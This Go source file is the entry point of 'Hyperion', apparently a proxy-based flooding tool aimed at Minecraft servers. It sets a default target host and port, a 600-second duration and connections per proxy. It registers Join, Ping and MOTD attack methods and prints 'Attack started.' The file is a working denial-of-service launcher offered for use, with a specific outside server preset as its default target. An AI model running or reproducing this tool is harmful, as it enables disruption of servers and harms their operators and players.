package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"flag"
	"fmt"
	"time"
)

var (
	ip       = flag.String("ip", "lenni0451.net", "sets ip")
	port     = flag.String("port", "25565", "sets port")
	protocol = flag.Int("protocol", 761, "sets version protocol")
	duration = flag.Int("duration", 600, "duration in sec")
	cpp      = flag.Int("cpp", 5, "no of conn per proxy per delay")
	delay    = flag.Int("delay", 1, "delay in sec")
	loops    = flag.Int("loops", 1, "loops")
	perDelay = flag.Int("per", 1000, "per delay")
)

func main() {
	//runtime.GOMAXPROCS(runtime.NumCPU())
	fmt.Println("██╗░░█╗██╗░░░██╗██████╗░███████╗██████╗░██╗░█████╗░███╗░░██╗\n██║░░██║╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██║██╔══██╗████╗░██║\n███████║░╚████╔╝░██████╔╝█████╗░░██████╔╝██║██║░░██║██╔██╗██║\n██╔══██║░░╚██╔╝░░██╔═══╝░██╔══╝░░██╔══██╗██║██║░░██║██║╚████║\n██║░░██║░░░██║░░░██║░░░░░███████╗██║░░██║██║╚█████╔╝██║░╚███║\n╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚══╝\n  Also try Ares!\n  Made by AnAverageBeing\n")
	fmt.Println("  Starting Hyperion...")
	fmt.Println("Parsing arguments...")
	flag.Parse()
  
	fmt.Println("Preparing to attack...")

	info := core.AttackInfo{
		Ip:           *ip,
		Port:         *port,
		Protocol:     *protocol,
		Duration:     time.Duration(*duration) * time.Second,
		ConnPerProxy: *cpp,
		Delay:        time.Duration(*delay) * time.Second,
		Loops:        *loops,
		PerDelay:     *perDelay,
	}

	registerMethod(&info)

	method := methods.Join{
		Info:         &info,
	}
	method.Start()

  	fmt.Println("  Attack started.")
	time.Sleep(time.Duration(*duration) * time.Second)
	fmt.Println("  Attack ended.")
  
}

func registerMethod(info *core.AttackInfo) {
	method.RegisterMethod(methods.Join{
		Info:         info,
	})
	method.RegisterMethod(methods.Ping{
		Info:         info,
	})
	method.RegisterMethod(methods.MOTD{
		Info:         info,
	})
}
